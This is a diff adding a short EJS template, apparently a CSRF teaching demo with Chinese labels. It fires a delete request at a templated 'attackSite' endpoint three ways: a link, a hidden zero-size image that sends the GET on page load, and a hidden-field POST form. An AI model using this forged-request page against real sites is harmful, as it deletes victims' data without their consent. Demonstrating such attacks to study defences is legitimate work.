@@ -1,0 +1,16 @@
+<html> 
+    <body>
+        <h1><%= title %></h1>
+	    <a href=<%= attackSite %>/post/delete?id=3>按下去發送 Get</a><br>
+
+        <p>靠 img 發送 Get</p>
+        <img src=<%= attackSite %>/post/delete?id=3 width='0' height='0' />
+        <br>
+
+        <form action=<%= attackSite %>/post/delete method="POST">
+            <input type="hidden" name="id" value="3"/>
+            <input type="submit" value="傳送 Form 表單"/>
+        </form>
+        <br>
+    </body>
+</html>
